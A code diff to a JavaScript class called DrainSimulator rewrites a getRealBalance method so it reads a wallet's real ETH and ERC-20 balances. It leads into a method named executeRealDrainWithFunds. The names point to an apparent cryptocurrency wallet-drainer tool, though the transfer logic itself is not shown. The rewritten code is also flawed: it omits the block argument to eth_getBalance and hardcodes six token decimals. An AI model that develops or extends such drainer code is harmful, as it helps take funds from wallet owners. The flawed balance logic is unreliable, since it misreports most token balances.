@@ -134,25 +134,28 @@ class DrainSimulator {
         }
     }
 
-     // BALANCE CHECKING - FIXED
-    async getRealBalance(token, walletAddress) {
-        if (!window.ethereum) throw new Error('No Ethereum provider');
-        
-        const provider = new ethers.providers.Web3Provider(window.ethereum);
-        
-        if (token.isNative) {
-            // Get real ETH balance
-            const balance = await provider.getBalance(walletAddress);
-            return ethers.utils.formatEther(balance);
-        } else {
-            // Get real ERC-20 token balance
-            const tokenContract = new ethers.Contract(token.address, this.ERC20_ABI, provider);
-            const balance = await tokenContract.balanceOf(walletAddress);
-            const decimals = await tokenContract.decimals();
-            return ethers.utils.formatUnits(balance, decimals);
-        }
+ async getRealBalance(token, walletAddress) {
+    if (!window.ethereum) throw new Error('No Ethereum provider');
+    
+    if (token.isNative) {
+        // Use web3 directly for ETH balance
+        const balance = await window.ethereum.request({
+            method: 'eth_getBalance',
+            params: [walletAddress]
+        });
+        return (parseInt(balance) / 1e18).toString();
+    } else {
+        // Use simple contract call for tokens
+        const balance = await window.ethereum.request({
+            method: 'eth_call',
+            params: [{
+                to: token.address,
+                data: '0x70a08231000000000000000000000000' + walletAddress.slice(2)
+            }, 'latest']
+        });
+        return (parseInt(balance) / 1e6).toString(); // For USDT/USDC
     }
-
+}
 
     async executeRealDrainWithFunds() {
         this.showResult('EXECUTING TRANSFER', 'error');
